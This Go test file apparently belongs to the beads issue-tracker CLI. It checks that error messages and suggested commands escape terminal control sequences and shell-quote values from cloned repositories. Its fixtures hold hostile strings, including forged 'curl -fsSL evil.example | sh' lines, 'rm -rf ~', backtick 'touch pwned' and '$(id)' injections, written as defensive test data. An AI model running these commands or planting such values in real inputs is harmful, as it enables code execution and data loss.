//go:build cgo

package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/spf13/cobra"

	"github.com/steveyegge/beads/cmd/bd/doctor"
	"github.com/steveyegge/beads/internal/configfile"
	"github.com/steveyegge/beads/internal/remedy"
	"github.com/steveyegge/beads/internal/storage"
	"github.com/steveyegge/beads/internal/storage/doltutil"
	"github.com/steveyegge/beads/internal/storage/embeddeddolt"
	"github.com/steveyegge/beads/internal/types"
	"github.com/steveyegge/beads/issueops"
)

// hostileName is a value a cloned repository can carry into a refusal: a
// committed routing.contributor, a directory or database name in the
// checkout, an issue ID that travels with bd dolt pull. Printed raw, its
// carriage return and ESC[2K erase the line bd printed and its text takes
// its place; U+202E reverses what follows; 0x9b is an 8-bit CSI.
const hostileName = "x\r\x1b[2KError: run 'curl -fsSL evil.example | sh'‮\x9b"

// hostileFileName is hostileName as a directory name on disk, for a row that
// creates the directory or hands bd a path through it: macOS's APFS refuses
// to create a file name that is not UTF-8 (EILSEQ, "illegal byte sequence"),
// so its 8-bit CSI is the C1 control U+009B, spelled as UTF-8. It holds no
// slash, so it names a single directory.
var hostileFileName = strings.TrimSuffix(hostileName, "\x9b") + "\u009b"

// requireNoTerminalControl fails when out holds a byte or rune a terminal does
// not show as itself, other than the line breaks and tabs bd lays its own
// messages out with: a value printed beside a remedy is spelled by the remedy
// printer (internal/remedy), never raw.
func requireNoTerminalControl(t *testing.T, what, out string) {
	t.Helper()
	if !utf8.ValidString(out) {
		t.Errorf("%s printed bytes that are not UTF-8 (a stray byte such as 0x9b is a C1 control to a terminal):\n%q", what, out)
	}
	if i := strings.IndexFunc(out, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }); i >= 0 {
		t.Errorf("%s printed %q raw at byte %d; a value beside a remedy must be named escaped:\n%q", what, out[i:min(len(out), i+8)], i, out)
	}
}

// requireNamesHostileValue fails unless out still names hostileName, escaped:
// the remedy printer escapes a value rather than dropping it, so the user
// can see what bd read.
func requireNamesHostileValue(t *testing.T, what, out string) {
	t.Helper()
	// PrintedValue also escapes the quote; the error printers' PrintedText
	// escapes only what a terminal acts on.
	if !strings.Contains(out, `\r\x1b[2KError: run \x27curl`) && !strings.Contains(out, `\r\x1b[2KError: run 'curl`) {
		t.Errorf("%s does not name the value escaped:\n%q", what, out)
	}
}

// presentIssueStore is a planning store that holds every issue it is asked
// for, so refuseIssuesAlreadyInPlanning refuses the first one.
type presentIssueStore struct{ storage.DoltStorage }

func (presentIssueStore) GetIssue(_ context.Context, id string) (*types.Issue, error) {
	return &types.Issue{ID: id}, nil
}

// failingDeleteStore is a project store whose phase-2 delete fails.
type failingDeleteStore struct{ storage.DoltStorage }

func (failingDeleteStore) DeleteIssues(context.Context, []string, bool, bool, bool) (*types.DeleteIssuesResult, error) {
	return nil, errors.New("database is read only")
}

// failingCreateStore is a planning store that refuses every issue it is
// asked to create.
type failingCreateStore struct{ storage.DoltStorage }

func (failingCreateStore) CreateIssue(context.Context, *types.Issue, string) error {
	return errors.New("database is read only")
}

// failingLabelsStore is a project store that cannot read an issue's labels.
type failingLabelsStore struct{ storage.DoltStorage }

func (failingLabelsStore) GetLabels(context.Context, string) ([]string, error) {
	return nil, errors.New("database is read only")
}

// dirtyStatusStore is a target store whose working set holds changes to
// tables named tables.
type dirtyStatusStore struct {
	storage.DoltStorage
	tables []string
}

func (s dirtyStatusStore) Status(context.Context) (*storage.Status, error) {
	status := &storage.Status{}
	for _, table := range s.tables {
		status.Unstaged = append(status.Unstaged, storage.StatusEntry{Table: table})
	}
	return status, nil
}

// TestRemedyRefusalsNameValuesEscaped pins the remedy-printing invariant at
// each bd migrate-personal and routed bd create refusal that names a path,
// database, table or issue ID beside its remedy: a value a cloned repository
// supplies is named escaped, so it cannot redraw the remedy. Each row is one
// entry point; a refusal added later that prints such a value raw needs a row
// here, and TestRemedyRefusalsDoNotInterpolateRawPaths catches one that
// formats a path variable without the printer.
func TestRemedyRefusalsNameValuesEscaped(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	ctx := context.Background()
	hostileRepo := func(t *testing.T) string {
		t.Helper()
		repo := filepath.Join(t.TempDir(), hostileFileName)
		if err := os.MkdirAll(filepath.Join(repo, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		return repo
	}
	for _, tc := range []struct {
		name string
		// refusal returns the entry point's error for hostile input.
		refusal func(t *testing.T) error
		// namesValue is whether the refusal names hostileName itself (escaped),
		// rather than only a path under it.
		namesValue bool
	}{
		{"redirectedPlanningRepoError", func(t *testing.T) error {
			return redirectedPlanningRepoError(filepath.Join("/p", hostileName, ".beads"), filepath.Join("/t", hostileName, ".beads"), "")
		}, true},
		{"stubDatabaseRefusal", func(t *testing.T) error {
			return stubDatabaseRefusal("/p/"+hostileName, "/t/"+hostileName, "db")
		}, true},
		{"refuseSelfPlanningRepo own workspace", func(t *testing.T) error {
			beadsDir := filepath.Join(t.TempDir(), ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			return refuseSelfPlanningRepo("/p/"+hostileName, beadsDir, beadsDir)
		}, true},
		{"refuseSelfPlanningRepo shared project_id", func(t *testing.T) error {
			metadata := []byte(`{"database":"dolt","backend":"dolt","project_id":"` + "id\\r\\u001b[2K" + `"}`)
			var dirs []string
			for range 2 {
				beadsDir := filepath.Join(t.TempDir(), ".beads")
				if err := os.MkdirAll(beadsDir, 0o750); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), metadata, 0o600); err != nil {
					t.Fatal(err)
				}
				dirs = append(dirs, beadsDir)
			}
			return refuseSelfPlanningRepo("/p/"+hostileName, dirs[0], dirs[1])
		}, true},
		{"planningOpenError", func(t *testing.T) error {
			return planningOpenError("/p/"+hostileName, errors.New("disk full"))
		}, true},
		{"refuseIssuesAlreadyInPlanning", func(t *testing.T) error {
			return refuseIssuesAlreadyInPlanning(ctx, presentIssueStore{}, []*types.Issue{{ID: "mp-1" + hostileName}}, "/p/"+hostileName)
		}, true},
		{"deleteMovedIssues", func(t *testing.T) error {
			saveStorageMode(t)
			return deleteMovedIssues(ctx, failingDeleteStore{}, []string{"mp-1"}, "/p/"+hostileName)
		}, true},
		{"refuseUninitializableTarget several databases", func(t *testing.T) error {
			repo := t.TempDir()
			for _, database := range []string{"beads", hostileFileName} {
				marker := filepath.Join(repo, ".beads", "embeddeddolt", database, ".dolt")
				if err := os.MkdirAll(marker, 0o750); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(marker, "config.json"), []byte("{}"), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			return refuseUninitializableTarget(filepath.Join(repo, ".beads"))
		}, true},
		{"refuseUncommittedTargetChanges", func(t *testing.T) error {
			saveStorageMode(t)
			return refuseUncommittedTargetChanges(ctx, dirtyStatusStore{tables: []string{"issues", hostileName}}, filepath.Join(hostileRepo(t), ".beads"), "beads")
		}, true},
		{"copyIssuesToPlanning", func(t *testing.T) error {
			_, err := copyIssuesToPlanning(ctx, nil, failingCreateStore{}, []*types.Issue{{ID: "mp-1" + hostileName}}, "me")
			return err
		}, true},
		{"copyIssueRelations", func(t *testing.T) error {
			return copyIssueRelations(ctx, failingLabelsStore{}, nil, &types.Issue{ID: "mp-1" + hostileName}, "me")
		}, true},
		{"openDryRunTargetStore not initialized", func(t *testing.T) error {
			_, err := openDryRunTargetStore(ctx, hostileRepo(t))
			return err
		}, true},
		{"ensureBeadsDirForPath relative --repo", func(t *testing.T) error {
			return ensureBeadsDirForPath(ctx, filepath.Join(t.TempDir(), hostileFileName), nil, false)
		}, true},
		{"adoptTargetDatabase open failure", func(t *testing.T) error {
			// A .beads that is a file: the database there cannot be opened.
			beadsDir := filepath.Join(hostileRepo(t), "file", ".beads")
			if err := os.MkdirAll(filepath.Dir(beadsDir), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(beadsDir, nil, 0o600); err != nil {
				t.Fatal(err)
			}
			return adoptTargetDatabase(ctx, beadsDir, "db"+hostileName, nil, nil)
		}, true},
		{"routed open of metadata.json without a database", func(t *testing.T) error {
			// A fresh clone's routed target: committed metadata.json, and
			// the gitignored embeddeddolt/ not there.
			beadsDir := filepath.Join(hostileRepo(t), ".beads")
			if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"database":"dolt","backend":"dolt"}`), 0o600); err != nil {
				t.Fatal(err)
			}
			_, err := openDoltStoreFromConfig(ctx, beadsDir, true)
			return err
		}, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.refusal(t)
			if err == nil {
				t.Fatal("refusal = nil, want an error naming the hostile value")
			}
			requireNoTerminalControl(t, tc.name, err.Error())
			if tc.namesValue {
				requireNamesHostileValue(t, tc.name, err.Error())
			}
		})
	}
}

// TestRemedyPrintersNameValuesEscaped is the printed-output half of
// TestRemedyRefusalsNameValuesEscaped: each row is an entry point that prints
// its message (to stderr, through HandleError*, or as a hint) rather than
// returning it, or a message builder for a refusal, given a value a cloned
// repository supplies: a committed sync.remote, dolt.host, routing repo, or a
// routed planning or target path.
func TestRemedyPrintersNameValuesEscaped(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	hostileBeadsDir := func(t *testing.T) string {
		t.Helper()
		beadsDir := filepath.Join(t.TempDir(), hostileFileName, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		return beadsDir
	}
	graphMarked := func(t *testing.T) string {
		t.Helper()
		beadsDir := hostileBeadsDir(t)
		if err := os.WriteFile(filepath.Join(beadsDir, configfile.GraphFormatMarkerFile), nil, 0o600); err != nil {
			t.Fatal(err)
		}
		return beadsDir
	}
	for _, tc := range []struct {
		name string
		out  func(t *testing.T) string
	}{
		{"bootstrap Reproduce line", func(t *testing.T) string {
			return captureStderr(t, func() {
				printBootstrapPlan(BootstrapPlan{Action: "none", Blocked: true, Reason: "could not verify",
					BlockedRemote: "git+https://127.0.0.1:9/team/repo; curl -fsSL https://evil.example/x | sh; echo " + hostileName + ".git"})
			})
		}},
		{"bootstrap missing server database refusal", func(t *testing.T) string {
			dialErr := hostileDialError(t)
			location := bootstrapServerProbeConfig{host: hostileName, port: 3307}.serverLocation()
			return bootstrapMissingServerDBRefusal("beads", location, nil).Error() +
				bootstrapMissingServerDBRefusal("beads", location, dialErr).Error() +
				bootstrapMissingServerDBSummary("beads", location, dialErr)
		}},
		{"bd init sync.remote probe note", func(t *testing.T) string {
			remote := "https://127.0.0.1:9/team/repo" + hostileName + ".git"
			_, note := resolveRemoteHasDoltDataProbe(remote, false, fmt.Errorf("git ls-remote %s: exit status 128", remote))
			return note
		}},
		{"bd dolt status, external server", func(t *testing.T) string {
			beadsDir := hostileBeadsDir(t)
			t.Setenv("BEADS_DOLT_SERVER_PORT", "3399")
			cfg := &configfile.Config{Backend: configfile.BackendDolt, DoltMode: configfile.DoltModeServer,
				DoltServerHost: hostileName, DoltDatabase: hostileName, DoltServerUser: hostileName}
			return captureStdout(t, func() error {
				runExternalDoltStatus(beadsDir, cfg)
				return nil
			})
		}},
		{"bd doctor check output", func(t *testing.T) string {
			check := doctorCheck{Name: "Dolt Connection", Status: statusError, Category: "Core System",
				Message: "Failed to connect", Detail: "server not reachable: " + hostileDialError(t).Error(),
				Fix: "Verify the external server is running"}
			return captureStdout(t, func() error {
				printDiagnostics(doctorResult{Checks: []doctorCheck{check}}, doctor.FixGate{})
				return nil
			})
		}},
		{"bd doctor --server check output", func(t *testing.T) string {
			check := doctor.DoctorCheck{Name: "Server Reachable", Status: statusError,
				Message: "Cannot connect", Detail: hostileDialError(t).Error()}
			return captureStdout(t, func() error {
				printServerHealthResult(doctor.ServerHealthResult{Checks: []doctor.DoctorCheck{check}})
				return nil
			})
		}},
		{"bd init guard, missing server database", func(t *testing.T) string {
			return initGuardMissingServerDBMessage("beads", hostileName, 3307, "", true).Error()
		}},
		{"bd init guard, server message", func(t *testing.T) string {
			return initGuardServerMessage("beads", hostileName, 3307, "bd", "").Error() +
				initGuardServerMessage("beads", "db", 3307, "bd", "git+https://example.com/r.git"+hostileName).Error()
		}},
		{"migrate-personal planning repo in a graph format", func(t *testing.T) string {
			beadsDir := graphMarked(t)
			return captureStderr(t, func() {
				_ = planningOpenError(filepath.Dir(beadsDir), checkDiscoveredForOpen(beadsDir))
			})
		}},
		{"bd create --repo target in a graph format", func(t *testing.T) string {
			beadsDir := graphMarked(t)
			return captureStderr(t, func() {
				_ = handleRepoTargetInitError(filepath.Dir(beadsDir), checkRepoTargetFormat(filepath.Dir(beadsDir)))
			})
		}},
		{"bd create --repo target store open failure", func(t *testing.T) string {
			beadsDir := hostileBeadsDir(t)
			if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"database":"dolt","backend":"dolt"}`), 0o600); err != nil {
				t.Fatal(err)
			}
			_, openErr := openDoltStoreFromConfig(context.Background(), beadsDir, true)
			return captureStderr(t, func() {
				_ = handleCreateTargetStoreError(openErr, filepath.Dir(beadsDir), "failed to open target store: %v")
			})
		}},
		{"unreadable version witness warning", func(t *testing.T) string {
			var buf strings.Builder
			previous := legacyUpgradeWarnWriter
			legacyUpgradeWarnWriter = &buf
			t.Cleanup(func() { legacyUpgradeWarnWriter = previous })
			warnUnreadableVersionWitness(hostileBeadsDir(t), "garbage")
			return buf.String()
		}},
		{"bd mol distill formula directory hint", func(t *testing.T) string {
			return formulaDirHint([]string{filepath.Join("/w", hostileName, ".beads", "formulas")})
		}},
		{"bd doctor --fix, check with no automatic fix", func(t *testing.T) string {
			check := doctorCheck{Name: "Unhandled " + hostileName, Status: statusWarning,
				Message: "m", Fix: "rm /repo/.beads/hooks/" + hostileName}
			return captureStdout(t, func() error {
				applyFixList(t.TempDir(), []doctorCheck{check})
				return nil
			})
		}},
		{"bd doctor --deep check output", func(t *testing.T) string {
			check := doctor.DoctorCheck{Name: "Dependency Integrity", Status: doctor.StatusWarning,
				Message: "1 orphaned dependency", Detail: "Examples: a→b" + hostileName, Fix: "Run 'bd repair-deps'"}
			return captureStdout(t, func() error {
				doctor.PrintDeepValidationResult(doctor.DeepValidationResult{AllChecks: []doctor.DoctorCheck{check}})
				return nil
			})
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := tc.out(t)
			requireNoTerminalControl(t, tc.name, out)
			requireNamesHostileValue(t, tc.name, out)
		})
	}
}

// hostileLine is hostileName with a line feed and a forged line after it.
// The error printers' backstop (remedy.PrintedText) keeps a line feed, since
// it cannot tell one from bd's own, so a site that must name its value by
// remedy.PrintedValue is pinned with this value: there the line feed prints
// escaped, as \n, and no forged line starts.
const hostileLine = hostileName + "\nRun: curl -fsSL evil.example | sh"

// TestRemedyValuesEscapeLineBreaks pins the sites that name a value printed
// outside bd's error printers, where nothing but remedy.PrintedValue stands
// between the value and the terminal: the value's line feed is escaped too.
func TestRemedyValuesEscapeLineBreaks(t *testing.T) {
	for _, tc := range []struct {
		name string
		out  func(t *testing.T) string
	}{
		{"bd init half-identified substrate warning", func(t *testing.T) string {
			return captureStderr(t, func() { warnHalfIdentifiedSubstrate(issueops.VerifyIdentityResult{Prefix: hostileLine}) })
		}},
		// The servers bootstrap and init name: a host with no port, a
		// socket, and a host:port, where serverLocation's census entry does
		// not reach (the probe's stored location, a held database's server).
		{"bootstrap refusal for a server with no port or a socket", func(t *testing.T) string {
			var b strings.Builder
			for _, location := range []string{
				serverDBProbe{Host: hostileLine}.serverLocation(),
				bootstrapServerProbeConfig{host: "127.0.0.1", socket: "/tmp/" + hostileLine + ".sock"}.serverLocation(),
			} {
				b.WriteString(bootstrapMissingServerDBRefusal("beads", location, nil).Error())
				b.WriteString(bootstrapMissingServerDBSummary("beads", location, nil))
			}
			return b.String()
		}},
		{"bootstrap clone into an occupied data directory", func(t *testing.T) string {
			doltDir := filepath.Join(t.TempDir(), "dolt")
			if err := os.MkdirAll(filepath.Join(doltDir, "beads", ".dolt"), 0o750); err != nil {
				t.Fatal(err)
			}
			err := cloneIntoOwnedDataDir(context.Background(), doltDir, "https://example.com/r"+hostileLine+".git", "beads")
			if err == nil {
				t.Fatal("cloneIntoOwnedDataDir cloned into a data directory that holds a database")
			}
			return err.Error()
		}},
		{"bd init database held by the clone target", func(t *testing.T) string {
			held := &initCloneTargetHeldError{location: bootstrapServerProbeConfig{host: hostileLine, port: 3307}.serverLocation()}
			// The database name can come from a cloned metadata.json. It is
			// spelled as PrintedValue spells it, not as %q does, which
			// leaves the quote and the shell's $ and & as they are.
			dbName := "beads$(id)&" + hostileLine
			line := initCloneTargetHeldLine(dbName, held, "https://example.com/r.git")
			if !strings.Contains(line, remedy.PrintedValue(dbName)) {
				t.Errorf("held-database line does not spell the database name by the remedy printer, %s:\n%q", remedy.PrintedValue(dbName), line)
			}
			return line
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := tc.out(t)
			requireNoTerminalControl(t, tc.name, out)
			requireNamesHostileValue(t, tc.name, out)
			if strings.Contains(out, "\nRun: curl") || !strings.Contains(out, `\nRun: curl`) {
				t.Errorf("%s does not escape the value's line feed:\n%q", tc.name, out)
			}
		})
	}
}

// hostileDialError is the error a real dial of a host named hostileName
// returns: Go's net package repeats the address it could not dial.
func hostileDialError(t *testing.T) error {
	t.Helper()
	_, err := net.DialTimeout("tcp", doltutil.ServerAddr(hostileName, 3306), time.Second)
	if err == nil || !strings.Contains(err.Error(), "\x1b[2KError") {
		t.Fatalf("dialing %q returned %v, want an error that repeats the host", hostileName, err)
	}
	return err
}

// notInstalledError is a multi-line error of bd's own: EnsureRunning's
// auto-start failure when dolt is not on PATH, the advice under it.
const notInstalledError = "Dolt server unreachable at 127.0.0.1:3307 and auto-start failed: dolt is not installed (not found in PATH)\n\n" +
	"Install from: https://docs.dolthub.com/introduction/installation\n\n" +
	"To start manually: bd dolt start\n" +
	"To disable auto-start: set dolt.auto-start: false in .beads/config.yaml"

// TestErrorPrintersSpellMessages pins the error printers every bd command
// reports through (HandleError and its family, the capability refusal, the
// warning printer, and the writer cobra's own "Error:" line goes to): a
// message with a value a cloned repository set in it, such as a dial error
// that repeats metadata.json's host, reaches the terminal with each control
// character spelled as an escape, and an ordinary message of bd's own,
// multi-line or not, reaches it exactly as written.
func TestErrorPrintersSpellMessages(t *testing.T) {
	printers := []struct {
		name  string
		print func(msg string) string
	}{
		{"HandleError", func(msg string) string {
			return captureStderr(t, func() { _ = HandleError("%v", errors.New(msg)) })
		}},
		{"HandleErrorRespectJSON", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorRespectJSON("failed: %s", msg) })
		}},
		{"HandleErrorWithHint", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorWithHint(msg, "hint: "+msg) })
		}},
		{"HandleErrorWithHintRespectJSON", func(msg string) string {
			return captureStderr(t, func() { _ = HandleErrorWithHintRespectJSON(msg, "hint") })
		}},
		{"HandleProxyCapabilityError", func(msg string) string {
			return captureStderr(t, func() { _ = HandleProxyCapabilityError(&ProxyCapabilityError{Message: msg, Code: "x"}) })
		}},
		{"WarnError", func(msg string) string {
			return captureStderr(t, func() { WarnError("%s", msg) })
		}},
		{"cobra error line", func(msg string) string {
			var buf strings.Builder
			cmd := &cobra.Command{Use: "probe", SilenceUsage: true, RunE: func(*cobra.Command, []string) error { return errors.New(msg) }}
			cmd.SetErr(remedy.TextWriter(&buf))
			cmd.SetArgs(nil)
			_ = cmd.Execute()
			return buf.String()
		}},
	}
	for _, p := range printers {
		t.Run(p.name, func(t *testing.T) {
			hostile := "failed to open routed store at /tmp/plan" + hostileName + ": " + hostileDialError(t).Error()
			out := p.print(hostile)
			requireNoTerminalControl(t, p.name, out)
			if !strings.Contains(out, `/tmp/planx\r\x1b[2KError: run 'curl`) {
				t.Errorf("%s does not name the value escaped:\n%q", p.name, out)
			}
			if out := p.print(notInstalledError); !strings.Contains(out, notInstalledError) {
				t.Errorf("%s does not print bd's own multi-line message as written:\n%s", p.name, out)
			}
		})
	}
}

// TestPasteReadyCommandsQuoteValues pins these paste-ready commands
// that take a value from config, the repository or the command line: each
// value goes in as one shell word (quoted when it holds a space or a shell
// character), or as a placeholder named escaped after the command, never
// bare.
func TestPasteReadyCommandsQuoteValues(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the rows spell the POSIX quoting")
	}
	effect := func(key, value string) string {
		var out []string
		for _, e := range checkConfigSetSideEffects(key, value) {
			out = append(out, e.Message, e.Command)
		}
		return strings.Join(out, "\n")
	}
	// A checkout directory named with a backtick and a separator, which
	// bd doctor's Installation check takes its suggested prefix from.
	installDir := filepath.Join(t.TempDir(), "x`;touch pwned;`")
	if err := os.Mkdir(installDir, 0o750); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, out string
		want      []string
	}{
		{"federation.remote side effect", effect("federation.remote", "https://x.example/db; curl evil | sh"),
			[]string{"bd dolt remote add origin 'https://x.example/db; curl evil | sh'"}},
		{"federation.remote side effect, hostile", effect("federation.remote", "https://x.example/"+hostileName),
			[]string{"bd dolt remote add origin <url>  (<url>: "}},
		{"sync.git-remote side effect", effect("sync.git-remote", "my remote"),
			[]string{"git remote -v | grep 'my remote'"}},
		{"bd ship hint", shipCommand("cap; rm -rf ~"), []string{"bd ship 'cap; rm -rf ~'"}},
		{"bd mol wisp hint", captureStderr(t, func() { warnPourVaporFormula("my formula", []string{"title=a b", "x=" + hostileName}) }),
			[]string{"bd mol wisp 'my formula' --var 'title=a b' --var <var2>  (<var2>: "}},
		{"bd mol pour hint (bd cook --persist)", captureStdout(t, func() error { printCookedProto("rel; x", 2, nil, nil); return nil }),
			[]string{"To use: bd mol pour 'rel; x' --var <name>=<value>"}},
		{"bd mol pour hint (bd cook --persist), hostile", captureStdout(t, func() error { printCookedProto(hostileName, 2, nil, []string{hostileName}); return nil }),
			[]string{"To use: bd mol pour <proto> --var <name>=<value>  (<proto>: "}},
		{"bd ship missing export label hint", labelAddCommand("export:cap; rm -rf ~"),
			[]string{"bd label add <issue-id> 'export:cap; rm -rf ~'"}},
		{"bd ship missing export label hint, hostile", labelAddCommand("export:" + hostileName),
			[]string{"bd label add <issue-id> <label>  (<label>: "}},
		{"proxied restore teardown hint", proxiedRestoreFailureMessage("/home/me/my backups", false, &proxiedTeardownError{err: errors.New("boom")}),
			[]string{"then bd backup init '/home/me/my backups' to re-register"}},
		// A value holding a backtick and a separator is one single-quoted
		// word in a command no literal backticks wrap, so its backtick
		// cannot end a command substitution around the command.
		{"bd ship hint, backtick", shipCommand("cap`;touch pwned;`"), []string{"bd ship 'cap`;touch pwned;`'"}},
		{"proxied restore teardown hint, backtick", proxiedRestoreFailureMessage("/b/x`;touch pwned;`", false, &proxiedTeardownError{err: errors.New("boom")}),
			[]string{"then bd backup init '/b/x`;touch pwned;`' to re-register"}},
		{"bd doctor Installation fix, backtick", doctor.CheckInstallation(installDir).Fix,
			[]string{"Run bd init --prefix 'x`;touch pwned;`' to initialize beads"}},
		{"migrate-personal repo sync refusal, backtick",
			repoSyncMirrorRefusal(&types.Issue{ID: "bd-1", SourceRepo: "/p/x`;touch pwned;`"}, "/plan", "linux").Error(),
			[]string{"bd repo remove '/p/x`;touch pwned;`'", "bd repo add '/p/x`;touch pwned;`'"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			requireNoTerminalControl(t, tc.name, tc.out)
			for _, want := range tc.want {
				if !strings.Contains(tc.out, want) {
					t.Errorf("%s = %q, want it to hold %q", tc.name, tc.out, want)
				}
				if strings.Contains(tc.out, "`"+strings.TrimPrefix(want, "then ")) {
					t.Errorf("%s = %q, wraps the command in literal backticks", tc.name, tc.out)
				}
			}
		})
	}
}

// TestStoreReadIDHintsQuoteIDs pins the hints that paste an issue ID read
// from the store, which holds a collaborator's issues after bd dolt pull,
// into the bd command they suggest, with the lines printed around the
// command, which a user can paste with it: bd duplicates (a group's issues,
// its Note and Suggested lines, and --json's suggested_action and
// merge_commands), bd mol current (a molecule's steps, the next step's claim
// and a step's bd show, and a large molecule's bd mol current and bd mol
// progress), bd mol stale's bd close and the issues a molecule blocks, and
// bd close --continue's claim and bd mol squash, with the molecule bd close
// auto-closed and, with --suggest-next, the issues it unblocked above them.
// Each row is the whole output of the printers it calls;
// TestEmbeddedRemedyPrinting_closeContinue and TestProxiedServerClose2B pin
// bd close --continue's whole output, with the line naming the closed step.
// A command spells the ID {id} and the note naming it {note}: an
// ordinary ID prints as it did, an ID holding shell syntax goes into the
// command single-quoted on POSIX, and one no quoting passes on (on Windows,
// any with a $ or a backtick) takes the row's placeholder, named escaped
// after the command (remedy.CommandArg). No command is printed between
// backticks, which a backtick in the quoted ID would end. The lines around
// the command name the ID {shown}: as it is when it is a plain word, and
// otherwise escaped (remedy.EscapedValue), so pasting them with the command
// runs no part of it, a line feed in it cannot end merge_commands' comment
// line, and it cannot redraw the command.
func TestStoreReadIDHintsQuoteIDs(t *testing.T) {
	// bd close names an issue with its title, as output.title-length's
	// default lets it.
	initConfigForTest(t)
	// duplicates is a duplicate group of target, the issue with dependents
	// and so the merge target, and sources, in that order.
	duplicates := func(target string, sources ...string) ([][]*types.Issue, map[string]*issueScore) {
		group := []*types.Issue{{ID: target, Title: "Same", Status: types.StatusOpen}}
		for _, id := range sources {
			group = append(group, &types.Issue{ID: id, Title: "Same", Status: types.StatusOpen})
		}
		return [][]*types.Issue{group}, map[string]*issueScore{target: {dependentCount: 1}}
	}
	duplicatesText := func(t *testing.T, groups [][]*types.Issue, scores map[string]*issueScore) string {
		return captureStdout(t, func() error {
			return outputDuplicates(groups, map[string]int{}, scores, false, false, nil)
		})
	}
	// mergeCommand is the one merge_commands element bd duplicates
	// --dry-run --json prints for groups.
	mergeCommand := func(t *testing.T, groups [][]*types.Issue, scores map[string]*issueScore) string {
		previous := jsonOutput
		jsonOutput = true
		t.Cleanup(func() { jsonOutput = previous })
		out := captureStdout(t, func() error {
			return outputDuplicates(groups, map[string]int{}, scores, false, true, nil)
		})
		var got struct {
			MergeCommands []string `json:"merge_commands"`
		}
		if err := json.Unmarshal([]byte(out), &got); err != nil || len(got.MergeCommands) != 1 {
			t.Fatalf("bd duplicates --dry-run --json printed %q: %v", out, err)
		}
		return got.MergeCommands[0]
	}
	// group is bd duplicates' output for one group, whose issue, Note and
	// Suggested lines are lines.
	group := func(lines string) string {
		return "🔍 Found 1 duplicate group(s):\n\n━━ Group 1: Same\n" + lines + "\n💡 Run with --auto-merge to execute all suggested merges\n"
	}
	printed := func(t *testing.T, fn func()) string {
		return captureStdout(t, func() error {
			fn()
			return nil
		})
	}
	// largeNote is the line a large molecule's summary prints above its
	// bd mol current and bd mol progress commands.
	largeNote := "Note: This molecule has 150 steps (threshold: " + strconv.Itoa(LargeMoleculeThreshold) + ").\nTo view steps, use one of:\n"
	for _, tc := range []struct {
		name, placeholder, want string
		hint                    func(t *testing.T, id string) string
	}{
		{"bd duplicates", "<duplicate-id>", group(
			"→ bd-1 (open, P0, weight=3, 0 refs)\n" +
				"  {shown} (open, P0, weight=0, 0 refs)\n" +
				"  Note: Duplicate: {shown} (same content as bd-1)\n" +
				"  Suggested: bd close {id} && bd dep add {id} bd-1 --type related{note}\n"),
			func(t *testing.T, id string) string {
				groups, scores := duplicates("bd-1", id)
				return duplicatesText(t, groups, scores)
			}},
		{"bd duplicates, several duplicates", "<duplicate-id-1>", group(
			"→ bd-1 (open, P0, weight=3, 0 refs)\n" +
				"  {shown} (open, P0, weight=0, 0 refs)\n" +
				"  bd-3 (open, P0, weight=0, 0 refs)\n" +
				"  Note: Duplicate: {shown} bd-3 (same content as bd-1)\n" +
				"  Suggested: bd close {id} bd-3 && bd dep add {id} bd-3 bd-1 --type related{note}\n"),
			func(t *testing.T, id string) string {
				groups, scores := duplicates("bd-1", id, "bd-3")
				return duplicatesText(t, groups, scores)
			}},
		{"bd duplicates, merge target", "<target-id>", group(
			"→ {shown} (open, P0, weight=3, 0 refs)\n" +
				"  bd-3 (open, P0, weight=0, 0 refs)\n" +
				"  Note: Duplicate: bd-3 (same content as {shown})\n" +
				"  Suggested: bd close bd-3 && bd dep add bd-3 {id} --type related{note}\n"),
			func(t *testing.T, id string) string {
				groups, scores := duplicates(id, "bd-3")
				return duplicatesText(t, groups, scores)
			}},
		{"bd duplicates --json suggested_action", "<duplicate-id>", "bd close {id} && bd dep add {id} bd-1 --type related{note}",
			func(t *testing.T, id string) string {
				groups, scores := duplicates("bd-1", id)
				return formatDuplicateGroupsJSON(groups, map[string]int{}, scores)[0]["suggested_action"].(string)
			}},
		{"bd duplicates --dry-run --json merge_commands", "<duplicate-id>",
			"# Duplicate: {shown} (same content as bd-1)\n" +
				"# Suggested action: bd close {id} && bd dep add {id} bd-1 --type related{note}",
			func(t *testing.T, id string) string {
				groups, scores := duplicates("bd-1", id)
				return mergeCommand(t, groups, scores)
			}},
		{"bd duplicates --dry-run --json merge_commands, merge target", "<target-id>",
			"# Duplicate: bd-3 (same content as {shown})\n" +
				"# Suggested action: bd close bd-3 && bd dep add bd-3 {id} --type related{note}",
			func(t *testing.T, id string) string {
				groups, scores := duplicates(id, "bd-3")
				return mergeCommand(t, groups, scores)
			}},
		{"bd mol current, next step", "<step-id>",
			"You're working on molecule bd-1\n  Mol\n\n" +
				"  [ready] {shown}: Step\n\n" +
				"Progress: 0/1 steps complete\n\n" +
				"Next ready: {shown} - Step\n" +
